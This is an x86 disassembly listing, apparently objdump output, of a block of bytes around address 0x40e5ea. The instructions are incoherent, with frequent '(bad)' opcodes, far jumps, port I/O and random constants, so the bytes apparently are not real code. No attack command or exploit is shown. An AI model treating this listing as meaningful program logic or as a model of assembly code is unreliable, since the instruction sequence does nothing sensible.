  40e5ea:	shr    BYTE PTR [edx+0x2b],1
  40e5ed:	push   es
  40e5ee:	push   ebp
  40e5ef:	adc    al,BYTE PTR [edi]
  40e5f1:	pop    edx
  40e5f2:	push   esi
  40e5f3:	or     ebp,DWORD PTR [esp+eax*4]
  40e5f6:	push   ds
  40e5f7:	js     0x40e605
  40e5f9:	int3   
  40e5fa:	jbe    0x40e583
  40e5fc:	jmp    0x1a2d0fd1
  40e601:	mov    ebx,0xcc385aa9
  40e606:	bound  ebx,QWORD PTR ds:0x55b1416f
  40e60c:	pushw  ds
  40e60e:	mov    ebx,0x75c6a17c
  40e613:	mov    bl,bh
  40e615:	test   edx,ebx
  40e617:	pop    ds
  40e618:	iret   
  40e619:	push   ss
  40e61a:	mov    eax,ds:0xe96b185d
  40e61f:	fidiv  WORD PTR [ebx-0x75]
  40e622:	sbb    esp,esp
  40e624:	test   BYTE PTR [eax],cl
  40e626:	cmc    
  40e627:	int    0x14
  40e629:	jno    0x40e5dc
  40e62b:	leave  
  40e62c:	scas   al,BYTE PTR es:[edi]
  40e62d:	into   
  40e62e:	out    0x93,al
  40e630:	loope  0x40e685
  40e632:	daa    
  40e633:	mov    dh,0x84
  40e635:	jp     0x40e66a
  40e637:	popf   
  40e638:	xchg   esp,eax
  40e639:	mov    ecx,DWORD PTR [ebx+edx*8-0xe3bb0db]
  40e640:	xchg   ecx,eax
  40e641:	push   es
  40e642:	or     cl,BYTE PTR [eax-0x12]
  40e645:	shl    BYTE PTR [ebx-0x72b268a3],cl
  40e64b:	ret    0xf022
  40e64e:	mov    edi,0xc985f03a
  40e653:	pop    esp
  40e654:	cmp    al,0x1c
  40e656:	jmp    ecx
  40e658:	mov    DWORD PTR [ecx+0x3b62c6b1],0x62ad6646
  40e662:	scas   eax,DWORD PTR es:[edi]
  40e663:	cmp    BYTE PTR gs:[edi-0x32],cl
  40e667:	retf   
  40e668:	dec    edx
  40e669:	inc    si
  40e66b:	mov    ecx,0x91296907
  40e670:	shr    bh,0xf2
  40e673:	inc    esi
  40e674:	or     ebx,DWORD PTR [esi+0x2f]
  40e677:	xlat   BYTE PTR ds:[ebx]
  40e678:	sub    al,0x6d
  40e67a:	xchg   edi,eax
  40e67b:	push   edx
  40e67c:	sub    eax,0x83bf455
  40e681:	dec    ecx
  40e682:	sbb    al,0xfe
  40e684:	(bad)  
  40e686:	inc    ecx
  40e687:	mov    dl,0xb0
  40e689:	or     ebp,0xffffffdb
  40e68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68d:	or     ah,bh
  40e68f:	dec    ebx
  40e690:	aaa    
  40e691:	stos   DWORD PTR es:[edi],eax
  40e692:	mov    ebx,0x18b268fa
  40e697:	add    ah,BYTE PTR [ecx+0x37]
  40e69a:	sub    dl,BYTE PTR [esi+0x281d26cf]
  40e6a0:	inc    edx
  40e6a1:	shl    DWORD PTR [edi-0x23],0x3c
  40e6a5:	jmp    0x5e25:0x74086343
  40e6ac:	cld    
  40e6ad:	pop    ecx
  40e6ae:	fstp   QWORD PTR [edx]
  40e6b0:	addr16 jmp 0x40e638
  40e6b3:	or     BYTE PTR [edx+0x3e],ch
  40e6b6:	pop    es
  40e6b7:	and    cl,ch
  40e6b9:	jb     0x40e650
  40e6bb:	stos   BYTE PTR es:[edi],al
  40e6bc:	ror    ch,1
  40e6be:	(bad)  
  40e6bf:	out    dx,al
  40e6c0:	lock fcom DWORD PTR [edx-0x52]
  40e6c4:	scas   al,BYTE PTR es:[edi]
  40e6c5:	jmp    0x1747:0x907f5633
  40e6cc:	add    al,0xb5
  40e6ce:	shr    BYTE PTR [eax],0x8f
  40e6d1:	inc    ecx
  40e6d2:	popa   
  40e6d3:	xchg   ecx,eax
  40e6d4:	ror    BYTE PTR [ebx-0x12],1
  40e6d7:	test   al,0x30
  40e6d9:	lea    esp,[edi]
  40e6db:	or     eax,0x138ab3ba
  40e6e0:	sub    DWORD PTR [eax],edx
  40e6e2:	and    ch,cl
  40e6e4:	call   0x71cafefa
  40e6e9:	sub    eax,esp
  40e6eb:	sub    eax,0x346e30fb
  40e6f0:	or     ecx,ebx
  40e6f2:	into   
  40e6f3:	inc    ebp
  40e6f4:	jmp    0x40e723
  40e6f6:	jmp    0xe39b:0x4add8699
  40e6fd:	and    ch,BYTE PTR ds:0xecd70e04
  40e703:	in     eax,0xd5
  40e705:	aam    0x20
  40e707:	ja     0x40e750
  40e709:	outs   dx,BYTE PTR ds:[esi]
  40e70a:	push   ebx
  40e70b:	and    dh,BYTE PTR [ebp+0x3de1654b]
  40e711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e712:	jns    0x40e702
  40e714:	adc    al,0xc0
  40e716:	adc    ch,BYTE PTR [edx+edi*8]
  40e719:	mov    dh,0x61
  40e71b:	repz call 0xd395:0xd803b780
  40e723:	repnz dec esi
  40e725:	arpl   WORD PTR gs:[edx-0x6e],bp
  40e729:	push   0x686c1a71
  40e72e:	fidivr DWORD PTR ds:[edi+0x3e]
  40e732:	mov    cl,BYTE PTR [ebp+0x15436752]
  40e738:	mov    gs,ecx
  40e73a:	iret   
  40e73b:	jno    0x40e7b0
  40e73d:	ins    BYTE PTR es:[edi],dx
  40e73e:	xor    bh,BYTE PTR [eax+0x1fb94567]
  40e744:	iret   
  40e745:	xchg   esp,eax
  40e746:	and    ebp,DWORD PTR [edx-0x33]
  40e749:	sub    ebx,edi
  40e74b:	jo     0x40e747
  40e74d:	xor    eax,0x4d244ded
  40e752:	jecxz  0x40e757
  40e754:	loop   0x40e78b
  40e756:	mov    ch,0xa
  40e758:	fwait
  40e759:	inc    ebp
  40e75a:	fwait
  40e75b:	adc    ebp,esi
  40e75d:	call   DWORD PTR [edi+0x27]
  40e760:	push   esp
  40e761:	sub    bh,BYTE PTR [ebx+0x70aebbcd]
  40e767:	pop    es
  40e768:	sar    DWORD PTR ds:0x82cbe870,cl
  40e76e:	sbb    BYTE PTR [ebx-0x3a074c56],0x64
  40e775:	(bad)  [edx-0x2784634]
  40e77b:	pusha  
  40e77c:	adc    bh,BYTE PTR [ebx-0x34bfd6ba]
  40e782:	add    ebp,esi
  40e784:	jbe    0x40e7b9
  40e786:	add    cl,BYTE PTR [ebp+0xa91618c]
  40e78c:	jp     0x40e725
  40e78e:	mov    dh,0x54
  40e790:	xchg   ebp,eax
  40e791:	adc    eax,0x7522b413
  40e796:	shr    bh,1
  40e798:	test   al,0x45
  40e79a:	ja     0x40e796
  40e79c:	inc    eax
  40e79d:	icebp  
  40e79e:	mov    edi,0x1a60af56
  40e7a3:	lahf   
  40e7a4:	out    0xc5,eax
  40e7a6:	push   edx
  40e7a7:	hlt    
  40e7a8:	leave  
  40e7a9:	and    ah,bh
  40e7ab:	rcr    ebp,cl
  40e7ad:	adc    DWORD PTR [eax-0x79bc0f10],ecx
  40e7b3:	xor    ah,BYTE PTR [ebx]
  40e7b5:	push   0xaa65f9fc
  40e7ba:	call   0xe804:0xe8693e45
  40e7c1:	sahf   
  40e7c2:	and    ch,BYTE PTR [edx-0x77e55a6a]
  40e7c8:	(bad)  
  40e7c9:	mov    edi,0x933966be
  40e7ce:	pushf  
  40e7cf:	xchg   ecx,eax
  40e7d0:	jo     0x40e76a
  40e7d2:	(bad)  
  40e7d3:	in     eax,dx
  40e7d4:	loope  0x40e80c
  40e7d6:	(bad)  
  40e7d7:	es inc esi
  40e7d9:	cmp    DWORD PTR [esp+edi*2-0x78],0xffffff95
  40e7de:	scas   al,BYTE PTR es:[edi]
  40e7df:	push   ecx
  40e7e0:	sbb    al,0xea
  40e7e2:	xchg   DWORD PTR [edi+0x73],ebp
  40e7e5:	mov    eax,0xd8c66f7
  40e7ea:	popa   
  40e7eb:	adc    cl,cl
  40e7ed:	push   esp
  40e7ee:	mov    eax,0x207a175f
  40e7f3:	cwde   
  40e7f4:	jb     0x40e7ed
  40e7f6:	cmp    eax,0x3c029a5e
  40e7fb:	mov    BYTE PTR [esi+0x4084ac67],cl
  40e801:	sbb    al,0x67
  40e803:	rcl    dl,cl
  40e805:	sbb    al,0xe8
  40e807:	push   es
  40e808:	sbb    al,0xc2
  40e80a:	sbb    al,0xdd
  40e80c:	xlat   BYTE PTR ds:[ebx]
  40e80d:	mov    bl,0xc4
  40e80f:	dec    ebx
  40e810:	out    dx,eax
  40e811:	jb     0x40e859
  40e813:	lods   al,BYTE PTR ds:[esi]
  40e814:	sbb    eax,0xd1a1b5f7
  40e819:	loopne 0x40e84d
  40e81b:	pop    es
  40e81c:	xchg   DWORD PTR [edx],ebp
  40e81e:	push   ss
  40e81f:	xor    eax,0x9394bcb2
  40e824:	or     BYTE PTR [edx+ebx*4-0x5945cf91],dh
  40e82b:	jp     0x40e7da
  40e82d:	(bad)  
  40e82e:	rol    BYTE PTR [eax],1
  40e830:	sub    edi,DWORD PTR [edi+eiz*1]
  40e833:	in     eax,0x1a
  40e835:	ss pop ecx
  40e837:	scas   al,BYTE PTR es:[edi]
  40e838:	fistp  QWORD PTR [ecx-0x6e7610f0]
  40e83e:	mov    bl,ch
  40e840:	push   0xffffffac
  40e842:	movaps XMMWORD PTR [ebp-0x79],xmm2
  40e846:	and    edi,ebx
  40e848:	lds    edx,FWORD PTR [ecx+0x6f5361ca]
  40e84e:	ret    
  40e84f:	jns    0x40e7fb
  40e851:	arpl   WORD PTR [edi+edi*4],dx
  40e854:	int3   
  40e855:	jae    0x40e80b
  40e857:	int3   
  40e858:	mov    ds:0xcb94a42e,al
  40e85d:	mov    ch,0x2f
  40e85f:	jo     0x40e835
  40e861:	inc    ecx
  40e862:	sub    edx,DWORD PTR [esi+0x4bc41248]
  40e868:	pop    ss
  40e869:	and    al,0xde
  40e86b:	stos   DWORD PTR es:[edi],eax
  40e86c:	or     BYTE PTR [esi+0x24ac5676],dh
  40e872:	cmovge eax,DWORD PTR [edi]
  40e875:	jns    0x40e8e0
  40e877:	call   0x5288bd00
  40e87c:	ret    
  40e87d:	adc    ebp,DWORD PTR [esi-0x39952758]
  40e883:	clc    
  40e884:	cs fsubr st,st(5)
  40e887:	sbb    BYTE PTR [ecx-0x32f617d8],bl
  40e88d:	pop    esi
  40e88e:	adc    BYTE PTR [eax],bh
  40e890:	outs   dx,DWORD PTR ds:[esi]
  40e891:	mov    ds:0x800bcf90,eax
  40e896:	jge    0x40e8e7
  40e898:	ja     0x40e892
  40e89a:	fmul   DWORD PTR [ebx+ecx*1+0x17]
  40e89e:	mov    ecx,0xb27e5cac
  40e8a3:	stc    
  40e8a4:	outs   dx,BYTE PTR ds:[esi]
  40e8a5:	or     al,0xd5
  40e8a7:	scas   al,BYTE PTR es:[edi]
  40e8a8:	push   edx
  40e8a9:	lahf   
  40e8aa:	sub    DWORD PTR [edi],ecx
  40e8ac:	or     al,0x42
  40e8ae:	or     BYTE PTR [ebp+ebx*8+0x7],bh
  40e8b2:	push   esi
  40e8b3:	xchg   ecx,eax
  40e8b4:	lahf   
  40e8b5:	ja     0x40e8fb
  40e8b7:	mov    esp,0x62c82913
  40e8bc:	jne    0x40e845
  40e8be:	add    al,0xf2
  40e8c0:	adc    al,0xc8
  40e8c2:	pop    esp
  40e8c3:	push   ecx
  40e8c4:	xchg   esi,eax
  40e8c5:	inc    esi
  40e8c6:	cmp    ax,0x55a9
  40e8ca:	push   edi
  40e8cb:	ins    BYTE PTR es:[edi],dx
  40e8cc:	fild   DWORD PTR [eax]
  40e8ce:	ins    BYTE PTR es:[edi],dx
  40e8cf:	jo     0x40e8f9
  40e8d1:	push   ss
  40e8d2:	jl     0x40e881
  40e8d4:	addr16 cmp edx,ecx
  40e8d7:	icebp  
  40e8d8:	sub    BYTE PTR [edx],dh
  40e8da:	repz pop ebx
  40e8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8dd:	inc    ebx
  40e8de:	mov    dl,BYTE PTR [ecx+0x1c]
  40e8e1:	adc    ch,BYTE PTR [edx-0x30729377]
  40e8e7:	cmp    al,bl
  40e8e9:	mov    ds:0x914bac0b,al
  40e8ee:	mov    ds:0x45cd27b6,eax
  40e8f3:	aad    0xfc
  40e8f5:	and    edx,edi
  40e8f7:	mov    bl,BYTE PTR [edx+eax*2+0x3a]
  40e8fb:	push   es
  40e8fc:	js     0x40e8ff
  40e8fe:	out    0xd3,eax
  40e900:	fist   DWORD PTR [edi-0x1a]
  40e903:	les    eax,FWORD PTR gs:[ebp-0x2e]
  40e907:	mov    al,ds:0x401dbe65
  40e90c:	retf   
  40e90d:	add    eax,0x53205d51
  40e912:	jno    0x40e987
  40e914:	mov    bl,0x41
  40e916:	ret    0x3d0d
  40e919:	cmp    BYTE PTR [edi],dh
  40e91b:	pop    ss
  40e91c:	and    eax,DWORD PTR ds:0xb375139a
  40e922:	enter  0x7489,0xd
  40e926:	arpl   WORD PTR [edx+0x3fed9b6],sp
  40e92c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e92d:	push   ebx
  40e92e:	mov    eax,ds:0xc54a8bf
  40e933:	imul   eax,edi,0xffffffb4
  40e936:	or     ch,BYTE PTR ds:0x2d481cfb
  40e93c:	scas   eax,DWORD PTR es:[edi]
  40e93d:	lea    esi,[esp+ebx*2+0x74c850a4]
  40e944:	mov    BYTE PTR [edi+0x58947e2b],cl
  40e94a:	repz xor al,0xa5
  40e94d:	test   BYTE PTR [eax+0x282b0cda],cl
  40e953:	push   esp
  40e954:	data16 cli 
  40e956:	outs   dx,DWORD PTR ds:[esi]
  40e957:	out    dx,al
  40e958:	xor    eax,0x3b646ed2
  40e95d:	add    DWORD PTR [eax-0x6c7ff410],0xffffffda
  40e964:	pop    eax
  40e965:	push   0x35
  40e967:	sub    ch,BYTE PTR [ebp+eiz*1-0x5b44bf6a]
  40e96e:	sbb    BYTE PTR [eax],dh
  40e970:	std    
  40e971:	test   DWORD PTR [eax+0x5],edx
  40e974:	cmp    ebp,0xffffffe4
  40e977:	(bad)  
  40e978:	xchg   edx,eax
  40e979:	cmp    ecx,DWORD PTR [edx+0x18]
  40e97c:	mov    ch,0x98
  40e97e:	push   ebp
  40e97f:	out    dx,eax
  40e980:	mov    bh,0x1f
  40e982:	shr    BYTE PTR [eax-0x36],cl
  40e985:	cmp    al,0x6f
  40e987:	mov    al,ds:0x652e8fd4
  40e98c:	cmp    BYTE PTR [ecx+eiz*1+0x25a1600e],cl
  40e993:	and    al,0xe5
  40e995:	stc    
  40e996:	mov    ?,WORD PTR [esi+0x65828ade]
  40e99c:	aam    0x4f
  40e99e:	mov    bl,0x7d
  40e9a0:	bound  edx,QWORD PTR [esi+0x3b3b4b36]
  40e9a6:	cld    
  40e9a7:	push   ebx
  40e9a8:	nop
  40e9a9:	ins    BYTE PTR es:[edi],dx
  40e9aa:	inc    ecx
  40e9ab:	sbb    esi,ebp
  40e9ad:	fild   DWORD PTR [edi-0x2a]
  40e9b0:	jg     0x40e9b9
  40e9b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9b3:	je     0x40e9a7
  40e9b5:	icebp  
  40e9b6:	push   edi
  40e9b7:	lahf   
  40e9b8:	mov    bl,0x96
  40e9ba:	outs   dx,DWORD PTR ds:[esi]
  40e9bb:	out    0x66,al
  40e9bd:	or     edi,DWORD PTR [edi-0x10]
  40e9c0:	mov    ds:0xf7f97899,al
  40e9c5:	cwde   
  40e9c6:	mov    ebx,0x3c4b76be
  40e9cb:	jle    0x40e97e
  40e9cd:	repnz mov eax,ds:0xd7d1aeee
  40e9d3:	or     DWORD PTR [edi],eax
  40e9d5:	sub    dh,cl
  40e9d7:	loopne 0x40e9c7
  40e9d9:	jnp    0x40e984
  40e9db:	jl     0x40e9d9
  40e9dd:	aas    
  40e9de:	int3   
  40e9df:	or     bh,BYTE PTR [esp+eax*1]
  40e9e2:	sbb    BYTE PTR [edi-0x2b],0xfd
  40e9e6:	int3   
  40e9e7:	mov    edi,0xcaf4c73
  40e9ec:	out    dx,eax
  40e9ed:	push   esi
  40e9ee:	xchg   edi,eax
  40e9ef:	std    
  40e9f0:	and    DWORD PTR [eax],ecx
  40e9f2:	lods   eax,DWORD PTR gs:[esi]
  40e9f4:	and    ch,ch
  40e9f6:	fs call 0x88f76073
  40e9fc:	mov    eax,DWORD PTR [eax+0x4a0a0a6f]
  40ea02:	outs   dx,DWORD PTR ds:[esi]
  40ea03:	pusha  
  40ea04:	ret    0x875d
  40ea07:	mov    gs,WORD PTR [esi-0x6e]
  40ea0a:	xchg   esi,eax
  40ea0b:	in     eax,dx
  40ea0c:	inc    ebp
  40ea0d:	ret    0x7f8f
  40ea10:	xor    DWORD PTR [eax],ebp
  40ea12:	leave  
  40ea13:	je     0x40ea23
  40ea15:	xor    DWORD PTR [eax],ecx
  40ea17:	sub    cl,dh
  40ea19:	shl    esp,cl
  40ea1b:	call   0xb5c0:0x6717eb77
  40ea22:	ficom  WORD PTR [edx+edi*4-0x1b4a9681]
  40ea29:	arpl   WORD PTR [ebx],dx
  40ea2b:	test   DWORD PTR [edi+edx*8-0x2],edi
  40ea2f:	push   ebp
  40ea30:	(bad)  
  40ea31:	jg     0x40ea00
  40ea33:	sbb    ebp,DWORD PTR [ebx]
  40ea35:	(bad)  
  40ea36:	test   eax,0x7dec822a
  40ea3b:	dec    eax
  40ea3c:	mov    eax,ds:0x616dc447
  40ea41:	ficomp WORD PTR fs:[edi]
  40ea44:	push   esi
  40ea45:	mov    ecx,0x9cddf654
  40ea4a:	and    eax,0x110354df
  40ea4f:	dec    edx
  40ea50:	inc    esi
  40ea51:	stc    
  40ea52:	aas    
  40ea53:	loope  0x40ea97
  40ea55:	inc    esi
  40ea56:	cmp    cl,BYTE PTR [ebp-0x32]
  40ea59:	es mov cl,0x8a
  40ea5d:	mov    edx,0x568523d7
  40ea62:	mov    ds:0x8eec126b,al
  40ea67:	and    BYTE PTR [eax+ebx*8],al
  40ea6a:	ret    0x72a7
  40ea6d:	jecxz  0x40ea3c
  40ea6f:	add    bh,BYTE PTR [edi]
  40ea71:	mov    ebp,0xd7f69d38
  40ea76:	push   ds
  40ea77:	and    al,0x2
  40ea79:	push   esp
  40ea7a:	jns    0x40ea20
  40ea7c:	jae    0x40ea25
  40ea7e:	call   0xaa25dc4
  40ea83:	bound  ebx,QWORD PTR [ebx-0x342637d0]
  40ea89:	(bad)  
  40ea8a:	iret   
  40ea8b:	and    DWORD PTR [esi-0x7c568eb0],ecx
  40ea91:	mov    BYTE PTR [edx+0x4e113584],ah
  40ea97:	inc    eax
  40ea98:	jmp    0x464bd23d
  40ea9d:	and    BYTE PTR [edi],bh
  40ea9f:	in     al,dx
  40eaa0:	mov    edx,0xb2e2ee6b
  40eaa5:	jge    0x40ea9a
  40eaa7:	push   edi
  40eaa8:	mov    ch,0x63
  40eaaa:	loop   0x40eab4
  40eaac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaad:	fcomp  DWORD PTR [eax+0x3b66d417]
  40eab3:	(bad)  
  40eab4:	xor    dl,bh
  40eab6:	pop    ebx
  40eab7:	push   edi
  40eab8:	test   al,0xd1
  40eaba:	adc    cl,dl
  40eabc:	(bad)  
  40eabd:	mov    bh,0x3a
  40eabf:	mov    ebp,0x6056965
  40eac4:	repnz push 0x70
  40eac7:	push   0xef1fad40
  40eacc:	jp     0x40eb43
  40eace:	or     eax,0xa63f138f
  40ead3:	ins    BYTE PTR es:[edi],dx
  40ead4:	mov    ebp,0x630d1c74
  40ead9:	or     BYTE PTR [esi-0x4a],dl
  40eadc:	leave  
  40eadd:	loop   0x40ead7
  40eadf:	not    dl
  40eae1:	aas    
  40eae2:	repnz fmul DWORD PTR [ebx]
  40eae5:	loopne 0x40eb14
  40eae7:	(bad)  
  40eae8:	cmp    eax,0xe9fd1d07
  40eaed:	fs in  al,0xac
  40eaf0:	jb     0x40eb32
  40eaf2:	push   ss
  40eaf3:	aam    0xf
  40eaf5:	sbb    eax,0x226a0416
  40eafa:	(bad)  
  40eafb:	push   0xffffffef
  40eafd:	push   edx
  40eafe:	mov    esi,0xea59f892
  40eb03:	loope  0x40eaab
  40eb05:	sbb    BYTE PTR [edx],al
  40eb07:	pop    ds
  40eb08:	xchg   ecx,eax
  40eb09:	fisttp WORD PTR [eax+0x78a2d99f]
  40eb0f:	mov    ecx,0xbf95cd71
  40eb14:	arpl   WORD PTR [eax+0x53],si
  40eb17:	dec    ebp
  40eb18:	push   ebp
  40eb19:	test   dh,ah
  40eb1b:	mov    al,ds:0x411b40d7
  40eb20:	test   DWORD PTR [esi],edi
  40eb22:	add    bh,BYTE PTR [edi-0x46db05af]
  40eb28:	pop    es
  40eb29:	xchg   cl,bl
  40eb2b:	or     eax,0xc9a4cc39
  40eb30:	imul   ecx,DWORD PTR [edi-0x5ec44240],0x41
  40eb37:	push   ds
  40eb38:	lea    ebx,[ebp+0x20]
  40eb3b:	inc    ebp
  40eb3c:	mov    esp,0xbbd8d696
  40eb41:	fimul  DWORD PTR [esi+0x56]
  40eb44:	popa   
  40eb45:	push   DWORD PTR [esi+0x5de71f69]
  40eb4b:	xlat   BYTE PTR ds:[ebx]
  40eb4c:	push   ecx
  40eb4d:	sbb    DWORD PTR [edx-0x25],0xe0370be2
  40eb54:	push   esp
  40eb55:	in     al,0xde
  40eb57:	repnz imul ecx,DWORD PTR [edi+0x5f],0xfffffff9
  40eb5c:	fdiv   st,st(0)
  40eb5e:	xchg   BYTE PTR [edx+0x4098104],dh
  40eb64:	out    0x57,eax
  40eb66:	rcl    BYTE PTR [edi+0x4c],0x80
  40eb6a:	out    dx,al
  40eb6b:	adc    edx,ebp
  40eb6d:	stos   BYTE PTR es:[edi],al
  40eb6e:	jae    0x40ebde
  40eb70:	(bad)  
  40eb71:	out    0x8b,eax
  40eb73:	mov    dl,0xa9
  40eb75:	fld    DWORD PTR [ebx]
  40eb77:	cld    
  40eb78:	push   edi
  40eb79:	mov    WORD PTR [eax],ss
  40eb7b:	or     al,ch
  40eb7d:	mov    ecx,0xd71fa1d6
  40eb82:	mov    ebx,0xca98e92c
  40eb87:	out    0xb9,eax
  40eb89:	stos   DWORD PTR es:[edi],eax
  40eb8a:	int3   
  40eb8b:	add    al,0x25
  40eb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb8e:	pop    esp
  40eb8f:	or     eax,0x40df2f62
  40eb94:	jle    0x40eb2d
  40eb96:	jae    0x40ebc3
  40eb98:	sbb    eax,DWORD PTR [edi+0x7fb2e67c]
  40eb9e:	and    BYTE PTR [esi+0x6cf8af9f],cl
  40eba4:	push   ecx
  40eba5:	sahf   
  40eba6:	fidiv  WORD PTR [edx+0x40f9dbc2]
  40ebac:	sti    
  40ebad:	test   eax,0x1fdce3d8
  40ebb2:	sbb    al,0xe2
  40ebb4:	in     al,dx
  40ebb5:	leave  
  40ebb6:	out    dx,eax
  40ebb7:	addr16 es hlt 
  40ebba:	scas   eax,DWORD PTR es:[edi]
  40ebbb:	mov    ds:0x2bda33ab,eax
  40ebc0:	dec    esi
  40ebc1:	add    DWORD PTR [edx-0x13c6f8ff],edx
  40ebc7:	mov    DWORD PTR gs:[esi],esi
  40ebca:	outs   dx,BYTE PTR ds:[esi]
  40ebcb:	(bad)  
  40ebcc:	fdiv   DWORD PTR [edx]
  40ebce:	stos   BYTE PTR es:[edi],al
  40ebcf:	popa   
  40ebd0:	(bad)  
  40ebd2:	inc    esp
  40ebd3:	fldenv [edx-0x4a0e1edd]
  40ebd9:	push   ebx
  40ebda:	xchg   esi,eax
  40ebdb:	adc    dh,BYTE PTR [ebp+eiz*4-0x35]
  40ebdf:	add    eax,0x3e5a6ac8
  40ebe4:	dec    esp
  40ebe5:	push   ds
  40ebe6:	pop    edi
  40ebe7:	dec    ebp
  40ebe8:	jmp    0x40ec11
  40ebea:	neg    BYTE PTR [edx-0x6a198dea]
  40ebf0:	lods   al,BYTE PTR ds:[esi]
  40ebf1:	mov    eax,DWORD PTR ds:[ebp-0xb]
  40ebf5:	lea    edx,[ebx+0x72ffff12]
  40ebfb:	popa   
  40ebfc:	ficomp WORD PTR [esi]
  40ebfe:	mov    edx,ecx
  40ec00:	(bad)  
  40ec01:	call   0xf48a:0x91cfc646
  40ec08:	xor    esi,DWORD PTR [eax+ebx*1-0x45]
  40ec0c:	aas    
  40ec0d:	cs popa 
  40ec0f:	dec    ecx
  40ec10:	add    eax,0x7bee91b0
  40ec15:	fcomp  QWORD PTR [edi+0x3e1c6465]
  40ec1b:	rcr    BYTE PTR [ebx],0x63
  40ec1e:	std    
  40ec1f:	int3   
  40ec20:	dec    edi
  40ec21:	ins    BYTE PTR es:[edi],dx
  40ec22:	std    
  40ec23:	xchg   edi,eax
  40ec24:	fdivrp st(1),st
  40ec26:	mov    cl,0x1e
  40ec28:	daa    
  40ec29:	aas    
  40ec2a:	std    
  40ec2b:	mov    dh,BYTE PTR [eax+0x2a5d0a03]
  40ec31:	lea    edi,[ecx-0x28542c8e]
  40ec37:	jmp    0x79e3:0xbf97809f
  40ec3e:	test   al,0x46
  40ec40:	jmp    0x9baffa68
  40ec45:	xor    BYTE PTR [esp+edi*4],0xe9
  40ec49:	outs   dx,DWORD PTR ds:[esi]
  40ec4a:	lds    edx,FWORD PTR [ebx-0x28c6aece]
  40ec50:	popf   
  40ec51:	sub    al,0x8a
  40ec53:	in     eax,0x3a
  40ec55:	mov    DWORD PTR [ebx],edi
  40ec57:	inc    ebp
  40ec58:	shl    DWORD PTR ds:0xdf44dd50,1
  40ec5e:	jle    0x40ec61
  40ec60:	std    
  40ec61:	lds    esi,FWORD PTR [eax-0x22]
  40ec64:	in     al,dx
  40ec65:	sbb    DWORD PTR [ecx],edx
  40ec67:	cmp    eax,0x208eef05
  40ec6c:	pop    esi
  40ec6d:	(bad)  
  40ec6e:	adc    esp,DWORD PTR [esi-0x9588bbf]
  40ec74:	or     edi,DWORD PTR [ecx+edx*4]
  40ec77:	adc    edi,DWORD PTR [eax+0x5a]
  40ec7a:	out    0xee,al
  40ec7c:	test   BYTE PTR [ebp-0x727452a4],cl
  40ec82:	(bad)
  40ec86:	(bad)  
  40ec87:	jae    0x40ed04
  40ec89:	jge    0x40ec5d
  40ec8b:	jno    0x40ecee
  40ec8d:	shr    DWORD PTR [ebx+0x7e],0x63
  40ec91:	mov    cl,0xd8
  40ec93:	arpl   WORD PTR [ecx+0x0],si
	...
  40ed12:	add    BYTE PTR [eax],al
  40ed14:	xchg   edx,eax
  40ed15:	inc    esp
  40ed16:	scas   al,BYTE PTR es:[edi]
  40ed17:	jecxz  0x40ed17
  40ed19:	jmp    0x40ecfa
  40ed1b:	jne    0x40ed80
  40ed1d:	pop    ecx
  40ed1e:	jmp    0x23:0xfd55821d
  40ed25:	call   0x0:0x7690000
  40ed2c:	cmc    
  40ed2d:	xchg   ecx,eax
  40ed2e:	and    ecx,ecx
  40ed30:	xchg   esp,eax
  40ed31:	push   es
  40ed32:	std    
  40ed33:	jg     0x40ecfd
  40ed35:	push   es
  40ed36:	pop    es
  40ed37:	and    BYTE PTR [ecx+0x37ec1004],0xad
  40ed3e:	loopne 0x40ed3c
  40ed40:	mov    esp,0x34563c01
  40ed45:	push   edi
  40ed46:	push   edi
  40ed47:	push   ebx
  40ed48:	push   esi
  40ed49:	bnd jmp 0x8de93bfa
  40ed4f:	lock cld 
  40ed51:	out    0x38,eax
  40ed53:	add    eax,0xa8dc793a
  40ed58:	xor    BYTE PTR [ecx-0x53],dl
  40ed5b:	jnp    0x40ecff
  40ed5d:	addr16 sahf 
  40ed5f:	and    BYTE PTR [esi-0x5],al
  40ed62:	pop    esp
  40ed63:	loopne 0x40ece9
  40ed65:	lock jl 0x40ecfb
  40ed68:	retf   
  40ed69:	shl    DWORD PTR ds:0x73a268e3,0x78
  40ed70:	enter  0x4c5d,0xa4
  40ed74:	or     eax,0x4761d34a
  40ed79:	pop    esp
  40ed7a:	imul   edi,DWORD PTR [eax],0x604a90d9
  40ed80:	nop
  40ed81:	pop    edi
  40ed82:	leave  
  40ed83:	lea    edi,[esi+0x396e5509]
  40ed89:	pop    ecx
  40ed8a:	add    DWORD PTR [eax],0xe3790dd4
  40ed90:	pop    ss
  40ed91:	or     al,0x74
  40ed93:	(bad)
  40ed96:	lock (bad) 
  40ed98:	scas   al,BYTE PTR es:[edi]
  40ed99:	(bad)  
  40ed9a:	mov    bl,0xb9
  40ed9c:	daa    
  40ed9d:	mov    esi,0x7673c090
  40eda2:	add    BYTE PTR [ebp+0x2d5bb466],0x1c
  40eda9:	mov    eax,0x4b59d8e5
  40edae:	aas    
  40edaf:	popa   
  40edb0:	jge    0x40ee0c
  40edb2:	mov    ah,0x84
  40edb4:	mov    es,eax
  40edb6:	in     eax,dx
  40edb7:	pop    esp
  40edb8:	test   eax,0x7161eaab
  40edbd:	ja     0x40ed7b
  40edbf:	dec    edx
  40edc0:	sar    al,0x70
  40edc3:	sbb    bh,BYTE PTR [esi+0x5ed8bcd8]
  40edc9:	sbb    al,0x95
  40edcb:	jp     0x40ed83
  40edcd:	lock push esi
  40edcf:	jno    0x40edfb
  40edd1:	dec    ebx
  40edd2:	daa    
  40edd3:	stos   DWORD PTR es:[edi],eax
  40edd4:	inc    esi
  40edd5:	sub    al,0x2f
  40edd7:	gs pop esi
  40edd9:	inc    ebp
  40edda:	mov    ch,ah
  40eddc:	jmp    0x3d09:0x45a5a110
  40ede3:	sub    BYTE PTR [edi],dl
  40ede5:	retf   0x882c
  40ede8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ede9:	fist   WORD PTR [ecx+0x25e85f25]
  40edef:	jecxz  0x40ee41
  40edf1:	scas   eax,DWORD PTR es:[edi]
  40edf2:	mov    BYTE PTR ds:0x99d42150,dh
